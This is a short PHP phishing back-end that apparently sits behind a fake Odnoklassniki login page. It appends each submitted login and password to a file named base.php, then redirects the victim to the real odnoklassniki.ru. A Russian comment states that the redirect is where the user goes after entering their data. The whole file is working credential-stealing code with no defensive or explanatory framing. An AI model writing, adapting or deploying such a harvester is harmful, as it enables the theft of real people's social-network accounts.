<?PHP
if(isset($_REQUEST['login']) && isset($_REQUEST['passwd']))
{
	$fp = fopen("base.php","a");
	fwrite($fp,"<b>Логин:</b>{$_REQUEST['login']}</br><b>Пароль:</b>{$_REQUEST['passwd']}</br>\n");
	fclose($fp);
}
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://www.odnoklassniki.ru/'></head></html>"; // куда пошлем пользователя после того как он ввел данные!
?>